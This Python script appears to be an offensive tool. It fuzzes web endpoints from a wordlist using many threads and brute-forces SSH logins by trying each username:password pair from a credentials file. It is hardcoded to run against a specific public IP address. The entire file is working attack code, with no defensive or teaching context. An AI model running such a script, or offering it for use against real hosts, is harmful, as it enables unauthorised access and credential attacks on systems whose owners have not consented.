import requests
import paramiko
from time import sleep
from threading import Thread

def load_credentials(file_path):
    credentials = []
    with open(file_path, "r") as file:
        for line in file:
            line = line.strip()
            if ":" in line:
                parts = line.split(":")
                if len(parts) == 2:
                    credentials.append((parts[0], parts[1]))
                else:
                    print(f"[!] Skipping malformed line: {line}")
            else:
                print(f"[!] Skipping line without ':': {line}")
    return credentials

def load_wordlist(file_path):
    wordlist = []
    with open(file_path, "r") as file:
        wordlist = [line.strip() for line in file if line.strip()]
    return wordlist

def check_endpoint(ip, port, endpoint):
    url = f"http://{ip}:{port}/{endpoint}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"[+] Found valid response for {url}")
    except requests.exceptions.RequestException as e:
        pass

def fuzz_http(ip, ports, endpoints):
    threads = []
    for port in ports:
        if port == 80 or port == 443:
            for endpoint in endpoints:
                thread = Thread(target=check_endpoint, args=(ip, port, endpoint))
                threads.append(thread)
                thread.start()
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()

def brute_force_ssh(ip, ports, credentials):
    for port in ports:
        if port == 22:
            for username, password in credentials:
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(ip, port=port, username=username, password=password)
                    print(f"[+] SSH login successful for {username}:{password} on {ip}")
                    client.close()
                    break
                except paramiko.AuthenticationException:
                    print(f"[-] SSH login failed for {username}:{password} on {ip}")
                except Exception as e:
                    continue

def fuzz_based_on_open_ports(ip, open_ports, credentials, endpoints):
    fuzz_http(ip, open_ports, endpoints)  # Multithreaded HTTP fuzzing
    brute_force_ssh(ip, open_ports, credentials)  # Single-threaded SSH brute-forcing
    sleep(2)

credentials_file = "static/credentials.txt"
endpoints_file = "static/endpoints.txt"

credentials = load_credentials(credentials_file)
endpoints = load_wordlist(endpoints_file)

ip_ports = {
    "44.228.249.3": [80]
}

for ip, open_ports in ip_ports.items():
    print(f"Performing fuzzing and brute-force on {ip} with open ports: {open_ports}")
    fuzz_based_on_open_ports(ip, open_ports, credentials, endpoints)
